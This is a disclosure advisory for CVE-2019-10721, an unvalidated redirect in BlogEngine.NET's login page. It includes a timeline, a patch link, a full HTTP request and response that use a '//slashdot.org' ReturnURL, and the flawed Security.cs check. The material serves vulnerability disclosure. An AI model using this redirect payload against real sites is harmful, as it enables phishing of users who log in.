A unvalidated redirect, CVE-2019-10721, exists on BlogEngine.NET versions 3.3.7 and earlier on `login.aspx`.  This attack would send users that attempt to log in to the application to an external, potentially malicious, site.

## Vendor Patch

* <https://github.com/rxtur/BlogEngine.NET/releases/tag/v3.3.8.0>

## Timeline

* Identified: 30 Mar 2019
* Initial Developer Contact: 31 Mar 2019
* Issue Disclosed: 19 Jun 2019

## Description

The **ReturnURL** parameter can be set to an external URL.  If a user clicks a link with a malicious **ReturnURL**, such as `http://$RHOST/Account/login.aspx?ReturnURL=//slashdot.org`, the user will be redirected to the malicious site after successfully logging in to the application.  The following request demonstrates the behavior:

~~~
POST /Account/login.aspx?ReturnURL=<r:b>%2f%2fslashdot.org</r:b> HTTP/1.1
Host: $RHOST
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://$RHOST/Account/login.aspx?ReturnURL=//slashdot.org
Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 576

__VIEWSTATE=DanAcZcPJOojiW7E3LvrMfJu3hs0SKHBoBaexIYMslcJdEydu3cltGFlO9cTUd5Z4i3KdDLD%2Fdvpqre5FXnXPIRp%2BxmYnwi2BRxerRN3Ul0T27h1s81dQ8N1KslY%2B9G3APOoHkB%2Bm1Bwhb1w0w%2F5RNji82uGfuaUvneYwkPUd6kMA6zk&__VIEWSTATEGENERATOR=CD85D8D2&__EVENTVALIDATION=xJNBuo98hov1SBPdrP0kv1MQMlBJ0QMs3MKusjVY576tVnNbdvNoaUEnUaOHjK80aL1AvGIs1H82weh6d1sIWVIDpoQUfuc2D3C09OOXPel6ekXf%2BHXUyHxra0IP0jhuPNt9eV9NikMzvnp498lh9livj2rCmHEcbaJIE5Kq85YBFJn4&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in


HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=utf-8
Location: http://slashdot.org/
Server: Microsoft-IIS/10.0
Set-Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=; path=/; HttpOnly
X-Powered-By: ASP.NET
Date: Thu, 04 Apr 2019 17:33:07 GMT
Connection: close
Content-Length: 137

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="http://slashdot.org/">here</a>.</h2>
</body></html>
~~~

<pagebreak></pagebreak>

This behavior can be traced to:

~~~{command="BlogEngine/BlogEngine.Core/Services/Security/Security.cs"}
187                     // ignore Return URLs not beginning with a forward slash, such as remote sites.
188                     if (string.IsNullOrWhiteSpace(returnUrl) || !returnUrl.StartsWith("/"))
189                         returnUrl = null;
190
191                     if (!string.IsNullOrWhiteSpace(returnUrl))
192                     {
193                         context.Response.Redirect(returnUrl);
194                     }
195                     else
196                     {
197                         context.Response.Redirect(Utils.RelativeWebRoot);
198                     }
~~~

The application accepts a **ReturnUrl** that begins with `/`. `//` is commonly used to specify external URLs using the same protocol as the current page. `//slashdot.org` satisfies the requirement that the **ReturnURL** start with `/`.
